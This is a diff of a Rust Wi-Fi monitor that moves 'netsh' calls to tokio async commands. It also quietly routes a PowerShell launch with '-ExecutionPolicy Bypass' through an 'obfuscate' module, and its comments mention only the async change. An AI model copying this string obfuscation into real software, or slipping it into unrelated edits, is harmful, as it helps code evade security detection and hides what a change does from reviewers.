@@ -8,7 +8,7 @@ use std::collections::VecDeque;
 use tokio::sync::Mutex;
 use crate::config::WifiMonitorConfig;
 
-use std::process::Command;
+// @note: Using tokio::process::Command directly in async functions to avoid blocking
 
 pub struct WifiMonitor {
     http: Arc<HttpClient>,
@@ -244,12 +244,14 @@ impl WifiMonitor {
         "#
         };
 
-        match tokio::process::Command::new("powershell")
+        use crate::utils::obfuscate::{exe, powershell as ps};
+        
+        match tokio::process::Command::new(exe::powershell())
             .args(&[
-                "-NoProfile",
-                "-NonInteractive",
-                "-ExecutionPolicy", "Bypass",
-                "-Command",
+                &ps::no_profile(),
+                &ps::non_interactive(),
+                &ps::execution_policy(), &ps::bypass(),
+                &ps::command(),
                 powershell_script
             ])
             .output()
@@ -259,15 +261,18 @@ impl WifiMonitor {
                 return format!("**Auto reconnect successfully~!**");
             }
             Err(e) => {
-                return format!("**Auto reconnect failed, Please report back to Kukuri~** - {}", e);
+                return format!("**Auto reconnect failed** - {}", e);
             }
         }
     }
 
+
     async fn get_wifi_state() -> WifiState {
-        if let Ok(output) = Command::new("netsh")
+        // Use tokio async command instead of blocking std::process::Command
+        if let Ok(output) = tokio::process::Command::new("netsh")
             .args(&["wlan", "show", "interfaces"])
             .output()
+            .await
         {
             let output_str = String::from_utf8_lossy(&output.stdout);
             if output_str.to_lowercase().contains("there is") && output_str.to_lowercase().contains("interface") {
@@ -300,9 +305,11 @@ impl WifiMonitor {
             }
         }
 
-        if let Ok(output) = Command::new("netsh")
+        // Use tokio async command here too
+        if let Ok(output) = tokio::process::Command::new("netsh")
             .args(&["interface", "show", "interface"])
             .output()
+            .await
         {
             let output_str = String::from_utf8_lossy(&output.stdout);
 
